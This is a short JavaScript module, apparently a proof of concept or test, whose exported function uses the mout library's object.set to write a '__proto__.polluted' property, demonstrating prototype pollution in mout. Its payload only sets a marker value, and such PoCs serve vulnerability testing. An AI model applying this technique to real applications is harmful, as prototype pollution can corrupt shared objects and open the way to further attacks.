function exploitFunction(payload) {
    var mout = require("mout");
    var obj = payload.obj;

    mout.object.set(obj, "__proto__.polluted", "yes");

    return obj;
}

module.exports = { exploitFunction };